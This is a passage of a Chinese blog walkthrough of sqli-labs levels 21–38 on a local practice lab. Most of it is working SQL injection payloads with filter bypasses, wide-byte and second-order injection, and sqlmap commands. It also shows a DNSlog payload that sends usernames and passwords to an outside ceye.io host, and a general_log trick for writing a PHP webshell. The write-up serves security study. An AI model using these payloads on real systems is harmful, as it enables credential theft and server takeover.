<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021942494.png" srcset="/img/loading.gif" lazyload></p>
<p>好说，和之前一样，不过我们写的注入语句也应该编码</p>
<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021942602.png" srcset="/img/loading.gif" lazyload></p>
<p>报错了，考虑到我们用的Dumb’，应该是’)闭合</p>
<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021942542.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021942897.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021947200.png" srcset="/img/loading.gif" lazyload></p>
<p>自动也可以，先加上*</p>
<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021942080.png" srcset="/img/loading.gif" lazyload></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">python sqlmap.py <span class="hljs-operator">-</span>r E:\Users\CTFtools\sqlmap\bp抓包\less21.txt <span class="hljs-comment">--tamper base64encode.py</span><br></code></pre></td></tr></table></figure>

<p>要带个脚本，以便base64编码</p>
<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021942990.png" srcset="/img/loading.gif" lazyload></p>
<h2 id="Less-22"><a href="#Less-22" class="headerlink" title="Less-22"></a>Less-22</h2><p>和上题基本一样，但用Dumb’不好使，要换成双引号</p>
<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021943317.png" srcset="/img/loading.gif" lazyload></p>
<p>闭合正好是用双引号</p>
<h2 id="Less-23"><a href="#Less-23" class="headerlink" title="Less-23"></a>Less-23</h2><p>Get注入</p>
<p><code>?id=1&#39;</code>，用单引号闭合</p>
<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021943954.png" srcset="/img/loading.gif" lazyload></p>
<p>有报错，但常规报错注入不太行，说是过滤了注释符</p>
<p>但是可以参考之前一种情况</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and extractvalue(1,concat(0x7e,(select database()))) and &#x27;</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; =&#x27;</span><span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>

<p>然后id因为外面还有一层单引号，所以实际是‘1’ and extractvalue(1,concat(0x7e,(select database()))) and ‘1’ &#x3D;’1’，一点毛病没有</p>
<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021943181.png" srcset="/img/loading.gif" lazyload></p>
<p>联合注入也是可以的</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select 1,2,3&#x27;</span><br></code></pre></td></tr></table></figure>

<p>或者</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select 1,2,3 or &#x27;</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; = &#x27;</span><span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021943285.png" srcset="/img/loading.gif" lazyload></p>
<p>这就绕过了过滤</p>
<p>sqlmap也可以，像之前一样，用-u参数就行</p>
<h2 id="Less-24"><a href="#Less-24" class="headerlink" title="Less-24"></a>Less-24</h2><p>我们直接在登录或注册界面注入都会被过滤，而且忘记密码界面什么也没有，这个题是二次注入。</p>
<p>首先我们看到管理员账户，admin，密码是1,但是通常情况下我们是不知道密码的，只能猜测管理员账户的admin。</p>
<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021943337.png" srcset="/img/loading.gif" lazyload></p>
<p>我们利用带有管理员账号的注册用户名，然后在修改密码的时候达到修改管理员账号密码的效果。</p>
<p>注册用户名：<code>admin’ or ‘1’=’1</code></p>
<p>密码为：<code>admin</code>（随便设置），</p>
<p>注册成功后，登录进去修改密码，将密码改为 123，</p>
<p>更改后即可发现，admin用户的密码也被改成了123，</p>
<p>自行脑补一下，<code>update tables set password=’123’ where username=’admin’ or ‘1’=’1’</code>（完美闭合，语句没毛病）</p>
<p>也可以注册一个账号名叫admin’#。</p>
<p><code>UPDATE users SET PASSWORD=&#39;111111&#39; where username=&#39;admin&#39; # &#39; and password=&#39;admin原来的密码&#39;</code></p>
<p>（这个题感觉有些问题，只显示登录成功，重启了好几次也不行，具体思路就是这样）</p>
<h2 id="Less-25"><a href="#Less-25" class="headerlink" title="Less-25"></a>Less-25</h2><p>估计过滤了or和and，试了试，果然如此</p>
<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021943147.png" srcset="/img/loading.gif" lazyload></p>
<p>大小写绕过也没啥用</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; AnD extractvalue(1,concat(0x7e,(select database())))--+</span><br></code></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021943119.png" srcset="/img/loading.gif" lazyload></p>
<p>可以用变形</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; %26%26 extractvalue(1,concat(0x7e,(select database())))--+</span><br></code></pre></td></tr></table></figure>

<p>%26%26是url编码，是&amp;&amp;的意思（见下图）</p>
<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021943358.png" srcset="/img/loading.gif" lazyload></p>
<p>用嵌套也可以（双写绕过），应该是单次过滤</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; ANandD extractvalue(1,concat(0x7e,(select database())))--+</span><br></code></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021943413.png" srcset="/img/loading.gif" lazyload></p>
<p>联合查询也是可以的</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; union select 1,2,3--+</span><br></code></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021943699.png" srcset="/img/loading.gif" lazyload></p>
<p>我们可以采用双写绕过，information里面涉及or可以写成infoorrmation，password也应该改成passwoorrd。</p>
<h2 id="Less-25a"><a href="#Less-25a" class="headerlink" title="Less-25a"></a>Less-25a</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure>

<p>这题是整数型注入，不用闭合，过滤和上题相同。</p>
<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021943580.png" srcset="/img/loading.gif" lazyload></p>
<p>报错注入不好使了，有报错但是报错是固定的，告诉你错了但是不告诉你具体哪里错了。</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span> ANandD extractvalue(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> database())))<span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021943824.png" srcset="/img/loading.gif" lazyload></p>
<p>用联合注入，和上题类似（不用闭合）</p>
<h2 id="Less-26"><a href="#Less-26" class="headerlink" title="Less-26"></a>Less-26</h2><p>将and、or，注释符以及空格给过滤了，双写绕过或者使用&amp;&amp;和||替换。</p>
<p>常规代替空格的字符：</p>
<p><code>%09</code> TAB 键（水平）</p>
<p><code>%0a</code> 新建一行</p>
<p><code>%0b</code> TAB 键（垂直）</p>
<p><code>%0c</code> 新的一页</p>
<p><code>%0d</code> return 功能</p>
<p><code>%a0</code> 空格</p>
<p><code>/**/</code> 注释</p>
<p>这题基本上把所有可替代空格的都过滤了。但是空格的还可以用括号代替。</p>
<p>可以用||加报错注入</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;||extractvalue(1,concat(0x7e,(SelEct(database()))))||&#x27;</span><span class="hljs-number">0</span><br></code></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021943405.png" srcset="/img/loading.gif" lazyload></p>
<p>也可以用联合注入（%00截断），注意联合注入不能用||’0闭合</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;union(select(1),(2),(3));%00</span><br></code></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021943318.png" srcset="/img/loading.gif" lazyload></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">0</span><span class="hljs-string">&#x27;union(select(1),(2),(select(database())));%00</span><br></code></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021943253.png" srcset="/img/loading.gif" lazyload></p>
<p>……</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">0</span><span class="hljs-string">&#x27;union(select(1),(2),(group_concat(username,&#x27;</span><span class="hljs-operator">~</span><span class="hljs-string">&#x27;,passwoorrd))from(users));%00</span><br></code></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021943975.png" srcset="/img/loading.gif" lazyload></p>
<h2 id="Less-26a"><a href="#Less-26a" class="headerlink" title="Less-26a"></a>Less-26a</h2><p>用’)闭合，有报错但是报错是固定的，报错注入不好使</p>
<p>用联合注入，和上题类似</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">0</span><span class="hljs-string">&#x27;)union(select(1),(2),(select(database())));%00</span><br></code></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021943950.png" srcset="/img/loading.gif" lazyload></p>
<h2 id="Less-27"><a href="#Less-27" class="headerlink" title="Less-27"></a>Less-27</h2><p>union、select、空格以及注释符都会被过滤</p>
<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021943666.png" srcset="/img/loading.gif" lazyload></p>
<p>我们可以大小写绕过以及重写绕过，空格可以用其他符号代替，例如（）、%09等。</p>
<p>报错注入</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;||extractvalue(1,concat(0x7e,(SelEct(database()))))||&#x27;</span><span class="hljs-number">0</span><br></code></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021943637.png" srcset="/img/loading.gif" lazyload></p>
<p>联合注入也可以（参考图片底部显示的语句）</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">0</span><span class="hljs-string">&#x27;%09UnIoN%09SelEcT%091,2,(SelEcT(database()));%00</span><br></code></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021943338.png" srcset="/img/loading.gif" lazyload></p>
<h2 id="Less-27a"><a href="#Less-27a" class="headerlink" title="Less-27a"></a>Less-27a</h2><p>用”闭合，有报错但是报错也是固定的，报错注入不好使</p>
<p>联合注入，和上题类似</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">0</span>&quot;%09UnIoN%09SelEcT%091,2,(SelEcT(database()));%00<br></code></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021943919.png" srcset="/img/loading.gif" lazyload></p>
<h2 id="Less-28"><a href="#Less-28" class="headerlink" title="Less-28"></a>Less-28</h2><p>闭合是’)，过滤了空格，当union select相邻出现时一起过滤。</p>
<p>有报错但是报错是固定的，报错注入不好使</p>
<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021944798.png" srcset="/img/loading.gif" lazyload></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">0</span><span class="hljs-string">&#x27;)uNIOn(sELEct(1),(2),(select(database())));%00</span><br></code></pre></td></tr></table></figure>

<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">0</span><span class="hljs-string">&#x27;)union(select(1),(2),(select(database())));%00</span><br></code></pre></td></tr></table></figure>

<p>也好使，应该是用（把它们断开了，识别不了。</p>
<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021944507.png" srcset="/img/loading.gif" lazyload></p>
<h2 id="Less-28a"><a href="#Less-28a" class="headerlink" title="Less-28a"></a>Less-28a</h2><p>闭合不变，空格不被过滤</p>
<p>报错注入还是不好使，联合注入那就随便写了，注意union select不要相邻出现（可以直接照搬上题）</p>
<h2 id="Less-29"><a href="#Less-29" class="headerlink" title="Less-29"></a>Less-29</h2><h3 id="手动绕过防火墙"><a href="#手动绕过防火墙" class="headerlink" title="手动绕过防火墙"></a>手动绕过防火墙</h3><p>这里说这是世界上最好的防火墙</p>
<p>看我操作</p>
<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021944466.png" srcset="/img/loading.gif" lazyload></p>
<p>二十九关就是会对输入的参数进行校验是否为数字，但是在对参数值进行校验之前的提取时候只提取了第一个id值，其余的没有校验。如果我们有两个id参数，第一个id参数应是正常数字，第二个id参数可以进行sql注入。</p>
<p>查看源代码，发现原来是：get提交的参数如果重名则以最后一个为准，所以sql语句在接受相同参数时候接受的是后面的参数值，但是验证id是否是数字却只是验证了第一个id参数，所以可以在后面的参数注入。</p>
<p>实际过程中可能没机会看源代码，这里是培养我们尝试多个参数的意识</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-operator">&amp;</span> id<span class="hljs-operator">=</span><span class="hljs-number">0</span><span class="hljs-string">&#x27; union select 1,2,3--+</span><br></code></pre></td></tr></table></figure>

<p>（#注释不好使，只好用–+）</p>
<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021944702.png" srcset="/img/loading.gif" lazyload></p>
<p>报错注入也可以</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-operator">&amp;</span> id<span class="hljs-operator">=</span><span class="hljs-number">0</span><span class="hljs-string">&#x27; and extractvalue(1,concat(0x7e,(select database())))--+</span><br></code></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021944529.png" srcset="/img/loading.gif" lazyload></p>
<h3 id="自动绕过"><a href="#自动绕过" class="headerlink" title="自动绕过"></a>自动绕过</h3><p>直接就扫出来了</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">python sqlmap.py <span class="hljs-operator">-</span>u http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span>localhost<span class="hljs-operator">/</span>sqli<span class="hljs-operator">-</span>labs<span class="hljs-operator">/</span>Less<span class="hljs-number">-29</span><span class="hljs-operator">/</span>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-comment">--dbms mysql –batch</span><br></code></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021944213.png" srcset="/img/loading.gif" lazyload></p>
<p>当然也可以用参数–tamper</p>
<h2 id="Less-30"><a href="#Less-30" class="headerlink" title="Less-30"></a>Less-30</h2><p>第30关跟29关差不多，只不过30关用双引号闭合</p>
<p>Payload:</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-operator">&amp;</span> id<span class="hljs-operator">=</span><span class="hljs-number">0</span>&quot;union select 1,2,3--+<br></code></pre></td></tr></table></figure>

<p>用sqlmap要升一升level，–level 3就可以</p>
<h2 id="Less-31"><a href="#Less-31" class="headerlink" title="Less-31"></a>Less-31</h2><p>第31关跟30关差不多，只不过31关用”)闭合</p>
<p>Payload:</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-operator">&amp;</span> id<span class="hljs-operator">=</span><span class="hljs-number">0</span>&quot;)union select 1,2,3--+<br></code></pre></td></tr></table></figure>

<p>用sqlmap要升一升level，–level 3就可以</p>
<h2 id="Less-32"><a href="#Less-32" class="headerlink" title="Less-32"></a>Less-32</h2><p>使用preg_replace函数将 斜杠，单引号和双引号过滤了，如果输入id&#x3D;1”会变成id&#x3D;1\“,使得引号不起作用，但是可以注意到数据库使用了gbk编码。这里我们可以采用宽字节注入。</p>
<p>因为过滤方法主要就是在敏感字符前面添加 反斜杠 \，所以这里想办法干掉反斜杠即可。具体利用的话我们可以用%df 吃掉 \（%5c）</p>
<p>因为urlencode(\‘) &#x3D; %5c%27，如果我们在 %5c%27前面添加 %df，形 成%df%5c%27，MySQL 在 GBK 编码方式的时候会将两个字节当做一个汉字，这个时候就把 %df%5c当做是一个汉字，%27(单引号)则作为一个单独的符号在外面，同时也就达到了我们的目的。</p>
<p>联合注入</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">0</span><span class="hljs-operator">%</span>df<span class="hljs-operator">%</span><span class="hljs-number">27</span><span class="hljs-keyword">union</span><span class="hljs-operator">%</span><span class="hljs-number">20</span><span class="hljs-keyword">select</span><span class="hljs-operator">%</span><span class="hljs-number">201</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span><span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021944504.png" srcset="/img/loading.gif" lazyload></p>
<p>后续爆字段时候需要用的表名加了引号，只需将表名换成十六进制编码就行，</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">0</span><span class="hljs-operator">%</span>df<span class="hljs-operator">%</span><span class="hljs-number">27</span><span class="hljs-operator">%</span><span class="hljs-number">20</span><span class="hljs-keyword">union</span><span class="hljs-operator">%</span><span class="hljs-number">20</span><span class="hljs-keyword">select</span><span class="hljs-operator">%</span><span class="hljs-number">201</span>,group_concat(column_name),<span class="hljs-number">3</span><span class="hljs-operator">%</span><span class="hljs-number">20</span><span class="hljs-keyword">from</span><span class="hljs-operator">%</span><span class="hljs-number">20</span>information_schema.columns<span class="hljs-operator">%</span><span class="hljs-number">20</span><span class="hljs-keyword">where</span><span class="hljs-operator">%</span><span class="hljs-number">20</span>table_schema<span class="hljs-operator">=</span>database() <span class="hljs-keyword">and</span> table_name<span class="hljs-operator">=</span><span class="hljs-number">0x7573657273</span><span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021944893.png" srcset="/img/loading.gif" lazyload></p>
<p>报错注入</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">0</span><span class="hljs-operator">%</span>df<span class="hljs-operator">%</span><span class="hljs-number">27</span><span class="hljs-keyword">and</span><span class="hljs-operator">%</span><span class="hljs-number">20</span>extractvalue(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span><span class="hljs-operator">%</span><span class="hljs-number">20</span>database())))<span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021944135.png" srcset="/img/loading.gif" lazyload></p>
<h2 id="Less-33"><a href="#Less-33" class="headerlink" title="Less-33"></a>Less-33</h2><p>本关使用PHP中的addslashes()函数，addslashes()函数作用是返回在预定义字符之前添加反斜杠的字符串。预定义字符如下：</p>
<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021944962.png" srcset="/img/loading.gif" lazyload></p>
<p>由此看来与32关过滤防御方式基本是一样的，payload不变。</p>
<h2 id="Less-34"><a href="#Less-34" class="headerlink" title="Less-34"></a>Less-34</h2><p>POST注入+宽字节注入</p>
<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021944603.png" srcset="/img/loading.gif" lazyload></p>
<p>抓包、改包、放包</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-operator">%</span>df<span class="hljs-string">&#x27; union select 1,2--+</span><br></code></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021944680.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021944590.png" srcset="/img/loading.gif" lazyload></p>
<p>报错注入也行</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-operator">%</span>df<span class="hljs-string">&#x27; and extractvalue(1,concat(0x7e,(select database())))--+</span><br></code></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021944283.png" srcset="/img/loading.gif" lazyload></p>
<h2 id="Less-35"><a href="#Less-35" class="headerlink" title="Less-35"></a>Less-35</h2><p>数字型注入，不需要闭合。</p>
<p>使用addslashes函数对于输入的内容进行转义，但是id参数没有引号，主要影响在与后续爆字段时候需要用的表名加了引号，只需将表名换成十六进制编码就行，直接使用联合查询就可以了</p>
<p>Payload：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">0</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>#<br></code></pre></td></tr></table></figure>

<h2 id="Less-36"><a href="#Less-36" class="headerlink" title="Less-36"></a>Less-36</h2><p>使用mysql_real_escape_string函数对于特殊字符进行转义。id参数是单引号，payload和前面三十二关一样</p>
<h2 id="Less-37"><a href="#Less-37" class="headerlink" title="Less-37"></a>Less-37</h2><p>三十七关是post提交，使用mysql_real_escape_string函数对于账户和密码都进行转义，使用宽字节注入就行。payload和三十四关一样。</p>
<h2 id="Less-38"><a href="#Less-38" class="headerlink" title="Less-38"></a>Less-38</h2><h3 id="常规堆叠注入"><a href="#常规堆叠注入" class="headerlink" title="常规堆叠注入"></a>常规堆叠注入</h3><p>下面就开启堆叠注入了</p>
<p>三十八关其实就是单引号闭合，使用正常单引号闭合就可以进行注入，不过这里可以有另外一种注入就是堆叠注入，因为存在mysqli_multi_query函数，该函数支持多条sql语句同时进行。</p>
<p>其实直接用联合注入就可以，但是堆叠注入有自己的独特优势，比如建立新用户、删库等，这里还是要尝试一下。</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">0</span><span class="hljs-string">&#x27; union select 1,2,3;insert into users(id,username,password) values (&#x27;</span><span class="hljs-number">25</span><span class="hljs-string">&#x27;,&#x27;</span>myname<span class="hljs-string">&#x27;,&#x27;</span>meaning<span class="hljs-string">&#x27;)--+</span><br></code></pre></td></tr></table></figure>

<p>只演示创建新用户（用户名啥的可以自己随便写），就不删库了，后续做题还得用，但用法都是一样的</p>
<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021944269.png" srcset="/img/loading.gif" lazyload></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">25</span><span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure>

<p>成功写入</p>
<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021944784.png" srcset="/img/loading.gif" lazyload></p>
<p>DNSlog外带配合堆叠注入也是可以的，</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;;select load_file(concat(&#x27;</span>\\\\<span class="hljs-string">&#x27;,(select hex(concat_ws(&#x27;</span><span class="hljs-operator">~</span><span class="hljs-string">&#x27;,username,password)) from users limit 0,1),&#x27;</span>.gvc791.ceye.io\\abc<span class="hljs-string">&#x27;))--+</span><br></code></pre></td></tr></table></figure>

<h3 id="开启日志-Getshell"><a href="#开启日志-Getshell" class="headerlink" title="开启日志 Getshell"></a>开启日志 Getshell</h3><p>注意：这一部分知识需要有文件上传漏洞的基础，不属于SQL注入的知识</p>
<p>需要条件：</p>
<ol>
<li>Web 的物理路径（注意是物理路径，这里我们用的是phpstudy，地址应该是<code>E:\PhPstudy\phpstudy\_pro\WWW\sqli-labs</code>，phpstudy所在的地址不一定一样，根据自己的来）</li>
<li>MySQL 可以读写 Web 目录（需要注入手动开启）</li>
<li>Windows 成功率 高于 Linux。</li>
</ol>
<p>首先进入mysql查看当前的日志的相关配置：默认是没有开启的（OFF）</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SHOW</span> VARIABLES <span class="hljs-keyword">LIKE</span> <span class="hljs-string">&#x27;general%&#x27;</span>;<br></code></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021944578.png" srcset="/img/loading.gif" lazyload></p>
<p>这里尝试注入的时候手动开启：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;;set global general_log = &quot;ON&quot;;set global general_log_file=&#x27;</span>E:\\PhPstudy\\phpstudy_pro\\WWW\\sqli<span class="hljs-operator">-</span>labs\\shell.php<span class="hljs-string">&#x27;;--+</span><br></code></pre></td></tr></table></figure>

<p>这里的general_log_file可以根据自己的web物理路径来写，要能找到，最好写在sqli-labs目录下。</p>
<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021944357.png" srcset="/img/loading.gif" lazyload></p>
<p>尝试写入phpinfo()：</p>
